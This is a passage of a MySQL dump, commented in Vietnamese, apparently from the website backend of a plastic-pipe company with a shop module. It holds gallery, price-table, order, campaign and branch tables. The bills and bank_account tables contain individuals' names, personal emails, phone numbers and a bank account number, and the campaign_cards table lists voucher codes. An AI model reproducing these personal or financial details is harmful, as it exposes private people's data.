(297, NULL, 13, NULL, NULL, '[{\"photo\":\"1539674075_22.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 18, '2018-10-16 00:14:35', '2018-10-16 00:14:35'),
(298, NULL, 13, NULL, NULL, '[{\"photo\":\"1539674085_1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 19, '2018-10-16 00:14:45', '2018-10-16 00:14:45'),
(300, NULL, 14, NULL, NULL, '[{\"photo\":\"1539763639_8.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 2, '2018-10-17 01:07:19', '2018-10-17 01:07:19'),
(301, NULL, 14, NULL, NULL, '[{\"photo\":\"1539763662_14.jpg\"},{\"photo\":\"1539763662_15.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 3, '2018-10-17 01:07:42', '2018-10-17 01:07:42'),
(302, NULL, 14, NULL, NULL, '[{\"photo\":\"1539763693_2.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-10-17 01:08:13', '2018-10-17 01:08:13'),
(303, NULL, 14, NULL, NULL, '[{\"photo\":\"1539763708_5.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 5, '2018-10-17 01:08:28', '2018-10-17 01:08:28'),
(304, NULL, 14, NULL, NULL, '[{\"photo\":\"1539763754_18.jpg\"},{\"photo\":\"1539763754_19.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 6, '2018-10-17 01:09:14', '2018-10-17 01:09:14'),
(305, NULL, 14, NULL, NULL, '[{\"photo\":\"1539763792_9.jpg\"},{\"photo\":\"1539763792_16.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 7, '2018-10-17 01:09:52', '2018-10-17 01:09:52'),
(307, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764196_27.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 8, '2018-10-17 01:16:36', '2018-10-17 01:16:36'),
(310, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764362_cv.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 9, '2018-10-17 01:19:22', '2018-10-17 01:19:22'),
(313, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764484_25.jpg\"},{\"photo\":\"1539764484_Untitled-1.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 11, '2018-10-17 01:21:24', '2018-10-17 01:21:24'),
(314, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764525_20.jpg\"},{\"photo\":\"1539764528_Untitled-3.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 11, '2018-10-17 01:22:08', '2018-10-17 01:22:08'),
(315, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764574_21.jpg\"},{\"photo\":\"1539764574_22.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 12, '2018-10-17 01:22:54', '2018-10-17 01:22:54'),
(316, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764596_13.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 13, '2018-10-17 01:23:16', '2018-10-17 01:23:16'),
(317, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764612_23.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 14, '2018-10-17 01:23:32', '2018-10-17 01:23:32'),
(318, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764620_24.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 15, '2018-10-17 01:23:40', '2018-10-17 01:23:40'),
(319, NULL, 14, NULL, NULL, '[{\"photo\":\"1539764673_28.jpg\"},{\"photo\":\"1539764673_29.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 16, '2018-10-17 01:24:33', '2018-10-17 01:24:33'),
(320, NULL, 20, NULL, NULL, '[{\"photo\":\"1539765054_01.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-10-17 01:30:54', '2018-10-17 01:30:54'),
(322, NULL, 21, NULL, NULL, '[{\"photo\":\"1539768029_1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-10-17 09:20:29', '2018-10-17 02:20:29'),
(326, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767012_2.jpg\"},{\"photo\":\"1539767012_3.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 2, '2018-10-17 02:03:32', '2018-10-17 02:03:32'),
(327, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767030_4.1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 3, '2018-10-17 02:03:50', '2018-10-17 02:03:50'),
(331, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767144_5.jpg\"},{\"photo\":\"1539767144_6.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 4, '2018-10-17 02:05:44', '2018-10-17 02:05:44'),
(332, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767167_3.1.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 5, '2018-10-17 02:06:07', '2018-10-17 02:06:07'),
(333, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767204_7.jpg\"},{\"photo\":\"1539767204_9.1.jpg\"},{\"photo\":\"1539767204_9.2.jpg\"}]', NULL, NULL, NULL, 1, 3, NULL, 6, '2018-10-17 02:06:44', '2018-10-17 02:06:44'),
(334, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767247_10.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 7, '2018-10-17 02:07:27', '2018-10-17 02:07:27'),
(338, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767343_11.jpg\"},{\"photo\":\"1539767343_13.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 9, '2018-10-17 02:09:03', '2018-10-17 02:09:03'),
(337, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767328_12.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 8, '2018-10-17 02:08:48', '2018-10-17 02:08:48'),
(343, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767549_15.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 10, '2018-10-17 02:12:29', '2018-10-17 02:12:29'),
(344, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767570_14.jpg\"},{\"photo\":\"1539767570_16.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 11, '2018-10-17 02:12:50', '2018-10-17 02:12:50'),
(347, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767707_17.jpg\"},{\"photo\":\"1539767707_18.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 12, '2018-10-17 02:15:07', '2018-10-17 02:15:07'),
(348, NULL, 21, NULL, NULL, '[{\"photo\":\"1539768260_19.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 13, '2018-10-17 09:24:20', '2018-10-17 02:24:20'),
(349, NULL, 21, NULL, NULL, '[{\"photo\":\"1539767740_20.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 14, '2018-10-17 02:15:40', '2018-10-17 02:15:40'),
(350, NULL, 18, NULL, NULL, '[{\"photo\":\"1539768798_Tramexco-01.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 1, '2018-10-17 09:33:18', '2018-10-17 02:33:18'),
(351, NULL, 18, NULL, NULL, '[{\"photo\":\"1539768849_Tramexco-02.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 2, '2018-10-17 02:34:09', '2018-10-17 02:34:09'),
(352, NULL, 18, NULL, NULL, '[{\"photo\":\"1539768868_Tramexco-04.jpg\"},{\"photo\":\"1539768869_Tramexco-06.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 3, '2018-10-17 02:34:29', '2018-10-17 02:34:29'),
(353, NULL, 18, NULL, NULL, '[{\"photo\":\"1539768882_Tramexco-05.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 4, '2018-10-17 02:34:42', '2018-10-17 02:34:42'),
(354, NULL, 18, NULL, NULL, '[{\"photo\":\"1539768910_Tramexco-07.jpg\"},{\"photo\":\"1539768910_Tramexco-08.jpg\"}]', NULL, NULL, NULL, 1, 2, NULL, 5, '2018-10-17 02:35:10', '2018-10-17 02:35:10'),
(355, NULL, 18, NULL, NULL, '[{\"photo\":\"1539769006_Tramexco-13.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 6, '2018-10-17 09:36:46', '2018-10-17 02:36:46'),
(356, NULL, 18, NULL, NULL, '[{\"photo\":\"1539769048_Tramexco-09.jpg\"},{\"photo\":\"1539769048_Tramexco-10.jpg\"},{\"photo\":\"1539769048_Tramexco-15.jpg\"}]', NULL, NULL, NULL, 1, 3, NULL, 7, '2018-10-17 09:37:28', '2018-10-17 02:37:28'),
(357, NULL, 18, NULL, NULL, '[{\"photo\":\"1539769077_Tramexco-11.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 8, '2018-10-17 02:37:57', '2018-10-17 02:37:57'),
(359, NULL, 18, NULL, NULL, '[{\"photo\":\"1539769103_Tramexco-14.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 10, '2018-10-17 02:38:23', '2018-10-17 02:38:23'),
(360, NULL, 18, NULL, NULL, '[{\"photo\":\"1539769205_Tramexco-17.jpg\"},{\"photo\":\"1539769205_Tramexco-18.jpg\"},{\"photo\":\"1539769205_Tramexco-19.1.jpg\"}]', NULL, NULL, NULL, 1, 4, NULL, 11, '2018-10-17 09:40:05', '2018-10-17 02:40:05'),
(361, NULL, 18, NULL, NULL, '[{\"photo\":\"1539769268_Tramexco-19.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 12, '2018-10-17 02:41:08', '2018-10-17 02:41:08'),
(362, NULL, 18, NULL, NULL, '[{\"photo\":\"1539769279_Tramexco-20.jpg\"}]', NULL, NULL, NULL, 1, 1, NULL, 13, '2018-10-17 02:41:19', '2018-10-17 02:41:19');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `banggia`
--

CREATE TABLE `banggia` (
  `id` int(11) NOT NULL,
  `name` varchar(250) DEFAULT NULL,
  `alias` varchar(250) DEFAULT NULL,
  `content` text,
  `doc` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `banggia`
--

INSERT INTO `banggia` (`id`, `name`, `alias`, `content`, `doc`, `created_at`, `updated_at`) VALUES
(2, 'Bảng giá tại Hà Nội', 'bang-gia-tai-ha-noi', '<p><strong>Bảng gi&aacute; H&agrave;ng Vặn Ren mới nhất tại H&agrave; Nội</strong></p>\r\n<p>Thương hiệu Hathaco &Aacute;p dụng từ ng&agrave;y 8 th&aacute;ng 8 năm 2015 Để nhận được b&aacute;o gi&aacute; vật tư ng&agrave;nh nước v&agrave; c&aacute;c sản phẩm phụ kiện ống nhựa hdpe gi&aacute; tốt nhất c&ugrave;ng với chiết khấu tốt nhất cho đại l&yacute;, c&ocirc;ng tr&igrave;nh</p>\r\n<p><img class=\"img-fluid\" src=\"http://localhost/eu/backend/banggia/edit/images/price-table/price-table-item-1.jpg\" alt=\"\" /></p>\r\n<p>ĐỂ BIẾT TH&Ocirc;NG TIN CHI TIẾT XIN VUI L&Ograve;NG LI&Ecirc;N HỆ:</p>\r\n<p><strong class=\"text-uppercase\">C&Ocirc;NG TY TNHH SẢN XUẤT NHỰA CH&Acirc;U &Acirc;U</strong>&nbsp;<br />Trụ sở Hồ Ch&iacute; Minh : Số 68/8A Đường Trần Tấn, P.T&acirc;n Sơn Nh&igrave;, Q.T&acirc;n Ph&uacute;, TP.HCM&nbsp;<br />Tel :&nbsp;<a title=\"\" href=\"callto:02838493888\">0283.8493888</a>&nbsp;<br />Chi nh&aacute;nh H&agrave; Nội : Số 19 ng&otilde; 79 phố Y&ecirc;n Duy&ecirc;n, P.Y&ecirc;n Sở, Q.Ho&agrave;ng Mai, TP. H&agrave; Nội&nbsp;<br />Tel :&nbsp;<a title=\"\" href=\"callto:02432009195\">0243.2009195</a></p>', '1509933469_GCO PROFILE 2017.pdf', '2017-11-06 01:57:49', '2017-11-05 18:57:49'),
(4, 'Bảng giá tại TP.Hồ Chí Minh', 'bang-gia-tai-tpho-chi-minh', '<p><strong>Bảng gi&aacute; H&agrave;ng Vặn Ren mới nhất tại TP. Hồ Ch&iacute; Minh</strong></p>\r\n<p>Thương hiệu Hathaco &Aacute;p dụng từ ng&agrave;y 8 th&aacute;ng 8 năm 2015 Để nhận được b&aacute;o gi&aacute; vật tư ng&agrave;nh nước v&agrave; c&aacute;c sản phẩm phụ kiện ống nhựa hdpe gi&aacute; tốt nhất c&ugrave;ng với chiết khấu tốt nhất cho đại l&yacute;, c&ocirc;ng tr&igrave;nh sd</p>\r\n<p><img class=\"img-fluid\" src=\"http://localhost/eu/backend/banggia/images/price-table/price-table-item-1.jpg\" alt=\"\" /></p>\r\n<p>ĐỂ BIẾT TH&Ocirc;NG TIN CHI TIẾT XIN VUI L&Ograve;NG LI&Ecirc;N HỆ:</p>\r\n<p><strong class=\"text-uppercase\">C&Ocirc;NG TY TNHH SẢN XUẤT NHỰA CH&Acirc;U &Acirc;U</strong>&nbsp;<br />Trụ sở Hồ Ch&iacute; Minh : Số 68/8A Đường Trần Tấn, P.T&acirc;n Sơn Nh&igrave;, Q.T&acirc;n Ph&uacute;, TP.HCM&nbsp;<br />Tel :&nbsp;<a title=\"\" href=\"callto:02838493888\">0283.8493888</a>&nbsp;<br />Chi nh&aacute;nh H&agrave; Nội : Số 19 ng&otilde; 79 phố Y&ecirc;n Duy&ecirc;n, P.Y&ecirc;n Sở, Q.Ho&agrave;ng Mai, TP. H&agrave; Nội&nbsp;<br />Tel :&nbsp;<a title=\"\" href=\"callto:02432009195\">0243.2009195</a></p>', '1509893148_Tìm kiếm toàn văn.docx', '2017-11-05 14:45:48', '2017-11-05 07:45:48');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `bank_account`
--

CREATE TABLE `bank_account` (
  `id` int(11) NOT NULL,
  `img` varchar(255) DEFAULT NULL,
  `info` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `bank_account`
--

INSERT INTO `bank_account` (`id`, `img`, `info`, `created_at`, `updated_at`) VALUES
(1, '1507946485_logobidv.png', '<p>Số t&agrave;i khoản:&nbsp;001234646870</p>\r\n<p>Chủ t&agrave;i khoản:&nbsp;<span class=\"text-uppercase\">NGUYỄN HẢI YẾN</span></p>\r\n<p>Ng&acirc;n h&agrave;ng:&nbsp;Ng&acirc;n h&agrave;ng TMCP Ngoại thương Việt Nam Chi nh&aacute;nh Đống Đa</p>', '2017-10-14 02:01:25', '2017-10-13 19:01:25'),
(3, '1507946490_logobidv.png', '<p>Số t&agrave;i khoản:&nbsp;001234646870</p>\r\n<p>Chủ t&agrave;i khoản:&nbsp;<span class=\"text-uppercase\">NGUYỄN Ho&agrave;ng&nbsp;Hải</span></p>\r\n<p>Ng&acirc;n h&agrave;ng:&nbsp;Ng&acirc;n h&agrave;ng TMCP Ngoại thương Việt Nam Chi nh&aacute;nh&nbsp;H&agrave; Nội</p>\r\n<p>&nbsp;</p>', '2017-10-14 02:01:30', '2017-10-13 19:01:30');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `banner`
--

CREATE TABLE `banner` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `alias` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL DEFAULT '1',
  `image_path` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `alt` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `stt` int(11) NOT NULL DEFAULT '0',
  `com` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `banner_content`
--

CREATE TABLE `banner_content` (
  `id` int(11) NOT NULL,
  `image` varchar(255) NOT NULL,
  `link` varchar(255) DEFAULT NULL,
  `position` int(11) DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `banner_content`
--

INSERT INTO `banner_content` (`id`, `image`, `link`, `position`, `updated_at`, `created_at`) VALUES
(12, '1536136299_2-01.jpg', NULL, 2, '2018-09-05 01:31:39', '2017-11-07 19:07:42');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `banner_position`
--

CREATE TABLE `banner_position` (
  `id` int(11) NOT NULL,
  `name` varchar(255) CHARACTER SET utf8 DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `banner_position`
--

INSERT INTO `banner_position` (`id`, `name`, `created_at`, `updated_at`) VALUES
(2, 'Tin tức', '2017-10-14 03:36:18', '2017-10-13 20:36:18');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `bills`
--

CREATE TABLE `bills` (
  `id` int(11) NOT NULL,
  `full_name` varchar(250) DEFAULT NULL,
  `email` varchar(250) DEFAULT NULL,
  `phone` varchar(11) DEFAULT NULL,
  `address` varchar(250) DEFAULT NULL,
  `province` varchar(250) DEFAULT NULL,
  `district` varchar(250) DEFAULT NULL,
  `note` text,
  `status` tinyint(2) DEFAULT '0',
  `total` int(11) DEFAULT NULL,
  `detail` text,
  `created_at` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT '0000-00-00 00:00:00',
  `card_code` varchar(250) DEFAULT NULL,
  `payment` int(2) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `bills`
--

INSERT INTO `bills` (`id`, `full_name`, `email`, `phone`, `address`, `province`, `district`, `note`, `status`, `total`, `detail`, `created_at`, `updated_at`, `card_code`, `payment`) VALUES
(1, 'Hoàng Hồng Chương', 'chuonghoanghong@gmail.com', '0987654321', 'Cầu Diễn, Từ Liêm, Hà Nội', '4', NULL, 'sdfs', 1, 15000000, '[{\"product_name\":\"Iphone 5 32GB\",\"product_numb\":\"5\",\"product_price\":3000000,\"product_img\":\"1507862089_shop-item-8.jpg\",\"product_code\":\"tsf3\"}]', '2017-10-25 02:12:25', '2017-10-24 19:12:25', NULL, 1),
(2, 'Hoàng Hồng Chương', 'chuong1194@yahoo.com', '09983292', NULL, NULL, NULL, 'sdfsdf', 0, 22000000, '[{\"product_name\":\"S\\u1ea3n ph\\u1ea9m iphone 6 32GB\",\"product_numb\":\"6\",\"product_price\":2000000,\"product_img\":\"1508820259_upload_0dd04450f7694280ae3315e24e4256ce_large.jpg\",\"product_code\":null},{\"product_name\":\"HTC M8\",\"product_numb\":\"2\",\"product_price\":5000000,\"product_img\":\"1508820166_upload_f2b057cc8c454700a6cfd54fd6a27fc6_large.jpg\",\"product_code\":null}]', '2017-10-24 18:59:30', '2017-10-24 18:59:30', NULL, 0),
(4, 'Trần Văn A', 'admin@team.vn', '0987654321', 'Cầu Diễn, Từ Liêm, Hà Nội', NULL, NULL, 'sdasd', 3, 4000000, '[{\"product_name\":\"S\\u1ea3n ph\\u1ea9m iphone 6 32GB\",\"product_numb\":\"2\",\"product_price\":2000000,\"product_img\":\"1508820259_upload_0dd04450f7694280ae3315e24e4256ce_large.jpg\",\"product_code\":null}]', '2017-10-25 02:12:37', '2017-10-24 19:12:37', NULL, 0);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `campaigns`
--

CREATE TABLE `campaigns` (
  `id` int(11) NOT NULL,
  `campaign_name` varchar(100) CHARACTER SET utf8 NOT NULL,
  `campaign_type` int(2) DEFAULT NULL,
  `campaign_value` int(10) DEFAULT NULL,
  `campaign_expired` date DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `del_flg` int(1) NOT NULL DEFAULT '0',
  `card_numb` int(10) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `campaigns`
--

INSERT INTO `campaigns` (`id`, `campaign_name`, `campaign_type`, `campaign_value`, `campaign_expired`, `created_at`, `updated_at`, `del_flg`, `card_numb`) VALUES
(1, 'Chào mừng giáng sinh', 1, 100000, '2017-09-30', '2017-09-21 18:56:44', '2017-09-21 18:56:44', 0, 7),
(2, 'Chào thu', 2, 10, '2017-09-30', '2017-09-22 18:43:02', '2017-09-22 18:43:02', 0, 4);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `campaign_cards`
--

CREATE TABLE `campaign_cards` (
  `id` int(10) NOT NULL,
  `campaign_id` int(10) NOT NULL,
  `card_code` varchar(100) NOT NULL,
  `is_active` int(1) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL,
  `del_flg` int(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Đang đổ dữ liệu cho bảng `campaign_cards`
--

INSERT INTO `campaign_cards` (`id`, `campaign_id`, `card_code`, `is_active`, `created_at`, `updated_at`, `del_flg`) VALUES
(1, 1, 'hDXoOAI7BpxYJ', 0, '2017-09-21 18:55:29', '2017-09-21 18:55:29', 0),
(2, 1, 'FepHYPARhlTbe', 0, '2017-09-21 18:55:29', '2017-09-21 18:55:29', 0),
(3, 1, 'bpDe0nb31sZiN', 0, '2017-09-21 18:55:29', '2017-09-21 18:55:29', 0),
(4, 1, '0DK0VoB53JeJj', 0, '2017-09-21 18:55:29', '2017-09-21 18:55:29', 0),
(5, 1, 'hF3Ad1g7J411w', 0, '2017-09-21 18:55:29', '2017-09-21 18:55:29', 0),
(6, 1, '8PyZN6OTyAIwZ', 0, '2017-09-21 18:56:44', '2017-09-21 18:56:44', 0),
(7, 1, 'Zqy0atJII1nzS', 0, '2017-09-21 18:56:44', '2017-09-21 18:56:44', 0),
(8, 2, '3Qe06mci6qmMc', 0, '2017-09-22 18:43:02', '2017-09-22 18:43:02', 0),
(9, 2, 'vUrrWre9EN6iR', 0, '2017-09-22 18:43:02', '2017-09-22 18:43:02', 0),
(10, 2, 'IGzmLXBT9pDk5', 0, '2017-09-22 18:43:02', '2017-09-22 18:43:02', 0),
(11, 2, 'OXSiH6ooCzJj7', 0, '2017-09-22 18:43:02', '2017-09-22 18:43:02', 0);

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `chinhanh`
--

CREATE TABLE `chinhanh` (
  `id` int(11) NOT NULL,
  `name` varchar(250) DEFAULT NULL,
  `website` varchar(250) DEFAULT NULL,
  `phone` varchar(250) DEFAULT NULL,
  `address` varchar(250) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `chinhanh`
--

INSERT INTO `chinhanh` (`id`, `name`, `website`, `phone`, `address`, `created_at`, `updated_at`) VALUES
(1, 'Văn phòng Hồ Chí Minh', 'http://gco.vn/', '0283.8493888', 'Số 68/8A Đường Trần Tấn, P.Tân Sơn Nhì, Q.Tân Phú, TP.HCM', '2017-11-04 03:23:41', '2017-11-03 20:23:41'),
(2, 'Văn phòng Hà Nội', NULL, '0243.2009195', 'Số 19 ngõ 79 phố Yên Duyên, P.Yên Sở, Q.Hoàng Mai, TP. Hà Nội', '2017-11-04 03:24:55', '2017-11-03 20:24:55');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `contact`
--

CREATE TABLE `contact` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `title` text COLLATE utf8_unicode_ci NOT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `codemap` longtext COLLATE utf8_unicode_ci,
  `desc` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL,
  `keyword` longtext COLLATE utf8_unicode_ci,
  `description` longtext COLLATE utf8_unicode_ci,
  `stt` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `contacts`
--

CREATE TABLE `contacts` (
  `id` int(11) NOT NULL,
  `name` varchar(255) DEFAULT NULL,
  `email` varchar(255) CHARACTER SET latin1 DEFAULT NULL,
  `phone` varchar(11) CHARACTER SET latin1 DEFAULT NULL,
  `content` text CHARACTER SET latin1,
  `status` tinyint(2) DEFAULT '0',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `counter`
--

CREATE TABLE `counter` (
  `id` int(10) UNSIGNED NOT NULL,
  `tm` int(11) NOT NULL,
  `ip` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `district`
--

CREATE TABLE `district` (
  `id` int(11) NOT NULL,
  `district_name` varchar(250) DEFAULT NULL,
  `province_id` int(11) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `district`
--

INSERT INTO `district` (`id`, `district_name`, `province_id`, `created_at`, `updated_at`) VALUES
(1, 'Ba Đình', 4, '2017-09-24 18:03:47', '2017-09-24 18:03:47'),
(2, 'Từ Liêm', 4, '2017-09-24 18:04:29', '2017-09-24 18:04:29'),
(3, 'Hoàn Kiếm', 4, '2017-09-24 18:04:40', '2017-09-24 18:04:40'),
(4, 'Cầu giấy', 4, '2017-09-25 00:14:58', '2017-09-25 00:14:58');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `feedback`
--

CREATE TABLE `feedback` (
  `id` int(11) NOT NULL,
  `name` varchar(250) DEFAULT NULL,
  `content` text,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Đang đổ dữ liệu cho bảng `feedback`
--

INSERT INTO `feedback` (`id`, `name`, `content`, `created_at`, `updated_at`) VALUES
(1, 'Mr Lee', '<p>&nbsp;Ch&uacute;ng t&ocirc;i mong muốn lu&ocirc;n được l&agrave; đối t&aacute;c tin cậy, uy t&iacute;n của Qu&yacute; kh&aacute;ch h&agrave;ng v&agrave; k&iacute;nh mong được hợp t&aacute;c c&ugrave;ng Qu&yacute; kh&aacute;ch h&agrave;ng trong thời gian gần nhất.</p>', '2017-11-06 04:21:36', '2017-11-05 21:21:36');

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `footer`
--

CREATE TABLE `footer` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` text COLLATE utf8_unicode_ci NOT NULL,
  `title` text COLLATE utf8_unicode_ci NOT NULL,
  `photo` text COLLATE utf8_unicode_ci,
  `codemap` longtext COLLATE utf8_unicode_ci,
  `desc` longtext COLLATE utf8_unicode_ci,
  `content` longtext COLLATE utf8_unicode_ci,
  `status` int(11) NOT NULL,
  `stt` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Cấu trúc bảng cho bảng `gioithieu`
--

CREATE TABLE `gioithieu` (
  `id` int(11) NOT NULL,
  `name` varchar(250) DEFAULT NULL,
  `name_en` varchar(250) DEFAULT NULL,
  `alias` varchar(250) DEFAULT NULL,
  `image` text,
  `mota` text,
  `mota_en` text,
  `content` text,
  `content_en` text,
  `title` varchar(250) DEFAULT NULL,
  `title_en` varchar(250) DEFAULT NULL,
  `keyword` text,
  `keyword_en` text,
  `description` text,
  `description_en` text,
  `status` int(2) DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
